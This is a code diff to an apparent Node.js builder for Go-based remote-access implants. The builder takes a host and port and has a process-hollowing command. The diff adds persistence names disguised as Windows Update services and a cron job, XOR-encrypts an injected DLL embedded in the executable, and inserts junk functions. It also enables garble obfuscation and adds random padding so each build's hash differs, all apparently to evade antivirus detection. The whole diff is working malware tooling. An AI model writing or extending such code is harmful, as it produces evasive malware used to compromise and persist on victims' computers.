@@ -50,6 +50,54 @@ const PLAIN_COMMANDS = {
   obfHollowprocess: 'hollowprocess',
 };
 
+const PLAIN_SENSITIVE = {
+  obfPersistRegName: 'ScService',
+  obfWinUpdTask: 'WindowsUpdateService',
+  obfWinUpdShort: 'WindowsUpdate',
+  obfWinUpdBat: 'WindowsUpdateService.bat',
+  obfSystemUpdateCron: 'system-update',
+  obfV3CopyPrefix: 'winupdate',
+};
+
+function randomDllDropPrefix() {
+  const a = crypto.randomBytes(2).toString('hex');
+  const b = crypto.randomBytes(2).toString('hex');
+  return `svc${a}_${b}_`;
+}
+
+function writeEncryptedEmbeddedDll(workDir, dllPath, stamp) {
+  const dllBuf = fs.readFileSync(dllPath);
+  const key = crypto.randomBytes(32);
+  const enc = Buffer.alloc(dllBuf.length);
+  for (let i = 0; i < dllBuf.length; i++) enc[i] = dllBuf[i] ^ key[i % key.length];
+  const binName = `p_${stamp.slice(0, 10)}.bin`;
+  fs.writeFileSync(path.join(workDir, binName), enc);
+  const keyArr = [...key].join(', ');
+  fs.writeFileSync(
+    path.join(workDir, 'embedded_dll.go'),
+    `package main
+
+import _ "embed"
+
+//go:embed ${binName}
+var embeddedInjectEnc []byte
+
+var embeddedDllXorKey = []byte{${keyArr}}
+
+func embeddedInjectDLLBytes() []byte {
+	if len(embeddedInjectEnc) == 0 {
+		return nil
+	}
+	out := make([]byte, len(embeddedInjectEnc))
+	for i := range embeddedInjectEnc {
+		out[i] = embeddedInjectEnc[i] ^ embeddedDllXorKey[i%len(embeddedDllXorKey)]
+	}
+	return out
+}
+`
+  );
+}
+
 const APP_NAMES_WIN = [
   'AppLauncher.exe',
   'UpdateManager.exe',
@@ -188,8 +236,10 @@ function run(cmd, args, opts = {}) {
   });
 }
 
-function mutateSource(src, { xorKey, shiftValue, host, port, stamp, platform, buildid }) {
+function mutateSource(src, { xorKey, shiftValue, host, port, stamp, platform, buildid, dllDropPrefix }) {
   let out = src;
+
+  out = out.replace(/^\/\/[^\n]*\n(?:\/\/[^\n]*\n)*/m, '');
 
   // xorKey const
   out = out.replace(
@@ -205,6 +255,13 @@ function mutateSource(src, { xorKey, shiftValue, host, port, stamp, platform, bu
 
   // command obfuscated strings
   for (const [name, plain] of Object.entries(PLAIN_COMMANDS)) {
+    const hex = obfuscateString(plain, xorKey);
+    const re = new RegExp(`(${name}\\s*=\\s*)"[0-9a-fA-F]+"`, 'g');
+    out = out.replace(re, `$1"${hex}"`);
+  }
+
+  const sensitive = { ...PLAIN_SENSITIVE, obfDllDropPrefix: dllDropPrefix || randomDllDropPrefix() };
+  for (const [name, plain] of Object.entries(sensitive)) {
     const hex = obfuscateString(plain, xorKey);
     const re = new RegExp(`(${name}\\s*=\\s*)"[0-9a-fA-F]+"`, 'g');
     out = out.replace(re, `$1"${hex}"`);
@@ -232,7 +289,23 @@ function mutateSource(src, { xorKey, shiftValue, host, port, stamp, platform, bu
   );
 
   // Inject polymorphic stamp AFTER imports (Go: package → import → decls)
-  const noise = Array.from(crypto.randomBytes(48));
+  const noise = Array.from(crypto.randomBytes(48 + (crypto.randomBytes(1)[0] % 80)));
+  const junkLoops = 2 + (crypto.randomBytes(1)[0] % 4);
+  const junkFnFirst = `polyJunk_${stamp.slice(0, 8)}`;
+  let junkFuncs = '';
+  for (let j = 0; j < junkLoops; j++) {
+    const fn = `${junkFnFirst}_${j}`;
+    const n = 8000 + (crypto.randomBytes(2)[0] % 12000);
+    junkFuncs += `
+func ${fn}() int {
+	s := 0
+	for i := 0; i < ${n}; i++ {
+		s ^= (i * 31) ^ int(polyNoise_${stamp.slice(8, 16)}[i%len(polyNoise_${stamp.slice(8, 16)})])
+	}
+	return s
+}
+`;
+  }
   const junkVar = `
 // auto-generated polymorphic stamp — unique per build
 var (
@@ -240,8 +313,9 @@ var (
 	polyNoise_${stamp.slice(8, 16)} = []byte{${noise.join(', ')}}
 	PolyBuildId                                               = "${buildid}"
 )
-
+${junkFuncs}
 func polyBuildFingerprint() byte {
+	_ = ${junkFnFirst}_0()
 	return polyNoise_${stamp.slice(8, 16)}[0] ^ polyStamp_${stamp.slice(0, 8)}[0] ^ PolyBuildId[0]
 }
 `;
@@ -307,12 +381,15 @@ async function generateBuild(options = {}) {
   const shiftValue = 3 + (crypto.randomBytes(1)[0] % 15);
   const stamp = crypto.randomBytes(24).toString('hex');
   const buildid = crypto.randomBytes(16).toString('hex');
+  const dllDropPrefix = randomDllDropPrefix();
 
   const workDir = path.join(BUILDS_DIR, id);
   fs.mkdirSync(workDir, { recursive: true });
 
   const raw = fs.readFileSync(SOURCE, 'utf8');
-  const mutated = mutateSource(raw, { xorKey, shiftValue, host, port, stamp, platform, buildid });
+  const mutated = mutateSource(raw, {
+    xorKey, shiftValue, host, port, stamp, platform, buildid, dllDropPrefix,
+  });
   const goFile = path.join(workDir, 'main.go');
   fs.writeFileSync(goFile, mutated, 'utf8');
 
@@ -351,7 +428,7 @@ async function generateBuild(options = {}) {
   // Stub so main.go compiles before/without a packed DLL
   fs.writeFileSync(
     path.join(workDir, 'embedded_dll.go'),
-    `package main\n\nvar embeddedInjectDLL []byte\n`,
+    `package main\n\nfunc embeddedInjectDLLBytes() []byte { return nil }\n`,
     'utf8'
   );
 
@@ -379,13 +456,8 @@ async function generateBuild(options = {}) {
       if (fs.existsSync(dllPath) && fs.statSync(dllPath).size > 1000) {
         injectDllName = dllName;
         injectDllPacked = true;
-        // Embed into EXE via go:embed (overwrite stub)
-        fs.writeFileSync(
-          path.join(workDir, 'embedded_dll.go'),
-          `package main\n\nimport _ "embed"\n\n//go:embed ${dllName}\nvar embeddedInjectDLL []byte\n`,
-          'utf8'
-        );
-        console.log(`[BUILDER] Inject DLL ready (${fs.statSync(dllPath).size} bytes) — will embed in EXE`);
+        writeEncryptedEmbeddedDll(workDir, dllPath, stamp);
+        console.log(`[BUILDER] Inject DLL ready (XOR-embedded in EXE)`);
       }
     } catch (e) {
       console.warn('[BUILDER] DLL build failed (migrate will be unavailable):', e.message);
@@ -459,10 +531,9 @@ async function generateBuild(options = {}) {
   let args;
 
   // Build EXE package (.) — excludes dll_cgo.go (tag dll)
-  if (garblePath && !injectDllPacked) {
-    // garble + embed can be flaky; skip garble when we embedded a DLL
+  if (garblePath) {
     tool = garblePath;
-    args = ['-literals', '-tiny', `-seed=${stamp}`, 'build', `-ldflags=${ldflags}`, '-o', outPath, '.'];
+    args = ['-literals', '-tiny', `-seed=${stamp}`, 'build', '-trimpath', `-ldflags=${ldflags}`, '-o', outPath, '.'];
   } else {
     tool = 'go';
     args = ['build', '-trimpath', `-ldflags=${ldflags}`, '-o', outPath, '.'];
@@ -490,7 +561,7 @@ async function generateBuild(options = {}) {
   }
 
   // Append polymorphic padding (changes file hash without breaking PE/ELF load)
-  const pad = crypto.randomBytes(256 + (crypto.randomBytes(1)[0] % 3840));
+  const pad = crypto.randomBytes(512 + (crypto.randomBytes(1)[0] % 8192));
   fs.appendFileSync(outPath, pad);
 
   let signResult = { signed: false };
